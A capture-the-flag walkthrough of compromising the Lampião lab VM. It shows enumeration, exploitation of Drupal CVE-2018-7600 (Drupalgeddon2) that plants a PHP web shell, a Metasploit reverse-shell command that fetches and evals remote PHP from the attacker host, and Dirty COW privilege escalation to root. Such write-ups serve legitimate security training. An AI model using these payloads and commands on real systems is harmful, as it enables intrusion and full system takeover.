1. First thing to do is to fire up nmap against Lampi√£o VM (you can use options -sV -O -A for more enumeration)

# nmap -p- 192.168.95.133

Starting Nmap 7.60 ( https://nmap.org ) at 2018-08-01 22:15 CEST
Nmap scan report for 192.168.95.133
Host is up (0.0027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
1898/tcp open  cymtec-port
MAC Address: 00:0C:29:79:C2:8B (VMware)

2. The port 80 is open, I immediately run dirb in order to find some intersting URIs.

# dirb http://192.168.95.133/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Aug  1 21:48:14 2018
URL_BASE: http://192.168.95.133/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.95.133/ ----
                                                                               
(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)
                                                                               
-----------------
END_TIME: Wed Aug  1 21:48:15 2018
DOWNLOADED: 0 - FOUND: 0

No result was found. So, i tried to see what is running on port 1898 using the web browser. There is a web application accessible through the same port.

3. I lunched droopescan to look for more information about the version of drupal used as CMS (you can also dig in drupal files accessible via the URIs given by robots.txt file).

# droopescan scan drupal -u http://192.168.95.133:1898/
[+] Themes found:                                                               
    seven http://192.168.95.133:1898/themes/seven/
    garland http://192.168.95.133:1898/themes/garland/

[+] Possible interesting urls found:
    Default changelog file - http://192.168.95.133:1898/CHANGELOG.txt

[+] Possible version(s):
    7.54

[+] Plugins found:
    image http://192.168.95.133:1898/modules/image/
    profile http://192.168.95.133:1898/modules/profile/
    php http://192.168.95.133:1898/modules/php/

[+] Scan finished (0:00:24.141079 elapsed)

Applications devloped with drupal, prior to 7.58, are vulnerable to CVE-2018-7600 which allow a remote attacker to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. 
The links below contain the exploit scripts of this vulnerability: 

 ** https://www.exploit-db.com/exploits/44449/
 ** https://github.com/dreadlocked/Drupalgeddon2


4. However, I run the following script in order to exploit this vulnerability : 
# ./drupalgeddon2.rb http://192.168.95.133:1898/
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://192.168.95.133:1898/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.95.133:1898/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid,
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo JHRDDPDU
[+] Result : JHRDDPDU
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://192.168.95.133:1898/s.php)
[!] Response: HTTP 200 // Size: 6.   Something could already be there?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee s.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://192.168.95.133:1898/s.php' -d 'c=hostname'
lampiao>> 

The shell given is limited, for instance, you cannot change the current directory. Meanwhile, the web shell uploaded during the exploit is accessible the  http://192.168.95.133:1898/s.php?c="command".

5. Next, I used metasploit to get meterpreter session like the following :

msf > use exploit/multi/script/web_delivery
msf exploit(multi/script/web_delivery) > set target 1
target => 1
msf exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) > set lhost 192.168.95.137
lhost => 192.168.95.137
msf exploit(multi/script/web_delivery) > set srvport 8081
srvport => 8081
msf exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 192.168.95.137:4444 
[*] Using URL: http://0.0.0.0:8081/Lg6qmARaJT9B
[*] Local IP: http://192.168.95.137:8081/Lg6qmARaJT9B
[*] Server started.
[*] Run the following command on the target machine:
php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.95.137:8081/Lg6qmARaJT9B'));"

6. A meterpreter session with low privilege poped out after passing the php command into c paramater of the web shell. Then, we uploaded and executed LinEnum.sh and linux-exploit-suggester.sh scripts in order to get root privilege as shown below:

[*] Starting interaction with 1...

meterpreter > upload /root/Tools/privexec/LinEnum/LinEnum.sh
[*] uploading  : /root/Tools/privexec/LinEnum/LinEnum.sh -> LinEnum.sh
[*] uploaded   : /root/Tools/privexec/LinEnum/LinEnum.sh -> LinEnum.sh
meterpreter > upload /root/Tools/privexec/linux-exploit-suggester/linux-exploit-suggester.sh
[*] uploading  : /root/Tools/privexec/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
[*] uploaded   : /root/Tools/privexec/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
meterpreter > shell 
Process 26353 created.
Channel 4 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@lampiao:/var/www/html$ chmod 755 linux-exploit-suggester.sh
chmod 755 linux-exploit-suggester.sh
www-data@lampiao:/var/www/html$ chmod 755 LinEnum.sh
chmod 755 LinEnum.sh
www-data@lampiao:/var/www/html$ 

****** Don't forget to change the permissions.

7. Therefore, the results of the 2 scripts executed show that the OS is vulnerable dirty cow.  For this purpose, I used the first and third script from the following link https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs in order to check this vulnerability and gain the root access : 

meterpreter > shell
Process 30263 created.
Channel 6 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@lampiao:/var/www/html$ echo "Dirty cow" > /tmp/foo      
echo "Dirty cow" > /tmp/foo
www-data@lampiao:/var/www/html$ chmod 0404 /tmp/foo
chmod 0404 /tmp/foo
www-data@lampiao:/var/www/html$ gcc -pthread dirtyc0w.c -o dirtyc0w
gcc -pthread dirtyc0w.c -o dirtyc0w
www-data@lampiao:/var/www/html$ ./dirtc0w /tmp/foo Hi....
./dirtc0w /tmp/foo Hi....
bash: ./dirtc0w: No such file or directory
www-data@lampiao:/var/www/html$ ./dirtyc0w /tmp/foo Hi....
./dirtyc0w /tmp/foo Hi....
mmap b7752000

madvise 0

procselfmem 600000000

www-data@lampiao:/var/www/html$ cat /tmp/foo
cat /tmp/foo
Hi....cow //The OS is vulnerable to dirty cow
www-data@lampiao:/var/www/html$ gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
www-data@lampiao:/var/www/html$ gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread                
dirtycow-mem.c: In function 'get_range':
dirtycow-mem.c:139:3: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]
   sscanf(line, "%lx-%lx %s %*Lx %*x:%*x %*Lu %s", start, end, flags, filename);
   ^
dirtycow-mem.c:139:3: warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]
www-data@lampiao:/var/www/html$ ./dirtycow-mem
./dirtycow-mem
[*] range: b75ed000-b7798000]
[*] getuid = b76a6110
[*] mmap 0xb743d000
[*] exploiting (patch)
[*] patched (procselfmemThread)
[*] patched (madviseThread)
root@lampiao:/var/www/html# [*] exploiting (unpatch)
[*] unpatched: uid=33 (procselfmemThread)
[*] unpatched: uid=33 (madviseThread)

uid=0(root) gid=0(root) groups=0(root)
root@lampiao:/var/www/html# cat /root/flag.txt
cat /root/flag.txt
9740616875908d91ddcdaa8aea3af366
root@lampiao:/var/www/html# 

The system will crash after few minutes... no worries, there's no harm just reboot the machine.

Happy hacking !!!

Bl@ckSh
